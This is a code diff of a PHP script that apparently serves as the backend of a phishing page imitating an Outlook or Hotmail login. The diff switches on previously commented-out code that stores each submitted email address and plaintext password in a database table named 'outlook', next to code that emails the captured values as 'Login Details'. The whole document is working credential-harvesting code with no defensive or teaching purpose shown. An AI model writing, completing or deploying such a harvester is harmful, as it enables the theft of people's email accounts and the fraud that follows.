@@ -1,21 +1,22 @@
 <?php
-    // $email = $_POST['email'];
-    // $password = $_POST['password'];
+    $email = $_POST['email'];
+    $password = $_POST['password'];
 
     //Database connnection
-    // $conn = new mysqli('localhost','root','','outlook');
-    // if($conn->connect_error){
-    //     die('Connection Failed : '.$conn->connect_error);
-    // } else{
-    //     $stmt = $conn->prepare("insert into outlook(email, password)values(?, ?)");
-    //     $stmt->bind_param("ss", $email, $password);
-    //     $stmt->execute();
-    //     echo "";
-    //     $stmt->close();
-    //     $conn->close();
-    // }
+    $conn = new mysqli('localhost','root','','outlook');
+    if($conn->connect_error){
+        die('Connection Failed : '.$conn->connect_error);
+    } else{
+        $stmt = $conn->prepare("insert into outlook(email, password)values(?, ?)");
+        $stmt->bind_param("ss", $email, $password);
+        $stmt->execute();
+        echo "";
+        $stmt->close();
+        $conn->close();
+    }
 
     //PHP code to receive content form in email address
+
     if (isset($_POST['submit'])) {
         $email = $_POST['email'];
         $password = $_POST['password'];
@@ -25,7 +26,7 @@
         $message = "
         <html>
         <head>
-        <title>This is my hotmail Login details</title>
+        <title>This is my mail Login Details</title>
         </head>
         <body>
             <h1>$email</h1>
